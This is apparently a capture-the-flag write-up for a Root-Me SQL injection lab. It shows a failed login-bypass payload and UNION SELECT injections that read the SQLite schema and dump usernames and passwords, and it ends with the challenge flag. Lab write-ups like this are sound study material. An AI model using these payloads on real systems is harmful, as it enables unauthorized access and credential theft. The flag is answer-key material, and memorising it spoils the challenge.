
###### Challenge Description
https://www.root-me.org/fr/Documentation/Web/Injection-SQL


### Find the attack Vector

I tried a basic SQL injection in the login like this but it did not work :

```
login=administrator' OR '1'='1#&password=AD
```

I tried a basic SQL injection in the research section and it worked ! :



All info about SQL injection - String :

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-string


###### First I discovered that

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308100151.png)

The Select doesn't worked like showed in the github :
##### Explanation 

You must use **UNION SELECT** because it allows you to "glue" the results of your own malicious query (like extracting passwords) onto the end of the site's legitimate search results, whereas a simple **SELECT** would break the structure of the server's original query.

I did this to find the

```
' UNION SELECT 1,sql FROM sqlite_master--
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308095912.png)



Payload to find the admin password :

```
`' UNION SELECT username, password FROM users--`
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308095701.png)

Flag : c4K04dtIaJsuWdi